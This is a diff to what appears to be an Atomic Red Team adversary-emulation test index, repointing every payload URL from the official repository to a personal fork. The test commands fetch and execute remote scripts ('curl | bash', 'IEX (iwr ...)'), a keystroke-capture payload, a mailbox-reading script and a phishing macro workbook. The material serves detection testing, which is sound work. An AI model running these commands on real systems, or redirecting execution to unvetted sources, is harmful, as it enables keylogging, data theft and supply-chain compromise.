@@ -46978,7 +46978,7 @@ collection:
       auto_generated_guid: d9b633ca-8efb-45e6-b838-70f595c6ae26
       description: |
         Utilize PowerShell and external resource to capture keystrokes
-        [Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1)
+        [Payload](https://github.com/theclintox/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1)
         Provided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)
 
         Upon successful execution, Powershell will execute `Get-Keystrokes.ps1` and output to key.log.
@@ -47156,7 +47156,7 @@ collection:
           type: Path
           default: "$env:TEMP\\discovery.bat"
       executor:
-        command: 'Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat"
+        command: 'Invoke-WebRequest "https://raw.githubusercontent.com/theclintox/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat"
           -OutFile #{output_file}
 
 '
@@ -47179,7 +47179,7 @@ collection:
           type: Path
           default: "/tmp/T1074.001_discovery.log"
       executor:
-        command: 'curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh
+        command: 'curl -s https://raw.githubusercontent.com/theclintox/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh
           | bash -s > #{output_file}
 
 '
@@ -47281,7 +47281,7 @@ collection:
       - description: 'Get-Inbox.ps1 must be located at #{file_path}'
         prereq_command: 'if (Test-Path #{file_path}\Get-Inbox.ps1) {exit 0} else {exit
           1}'
-        get_prereq_command: Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1114.001/src/Get-Inbox.ps1"
+        get_prereq_command: Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/blob/master/atomics/T1114.001/src/Get-Inbox.ps1"
           -OutFile "#{file_path}\Get-Inbox.ps1"
       executor:
         command: 'powershell -executionpolicy bypass -command #{file_path}\Get-Inbox.ps1
@@ -49392,7 +49392,7 @@ initial-access:
             return 'Please install Microsoft Excel before running this test.'
           }
           else{
-            $url = 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'
+            $url = 'https://github.com/theclintox/atomic-red-team/blob/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'
             $fileName = 'PhishingAttachment.xlsm'
             New-Item -Type File -Force -Path $fileName | out-null
             $wc = New-Object System.Net.WebClient
@@ -49434,7 +49434,7 @@ initial-access:
           Stop-Process -Name WINWORD
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          IEX (iwr "https://raw.githubusercontent.com/theclintox/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
           $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
           Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
         cleanup_command: |
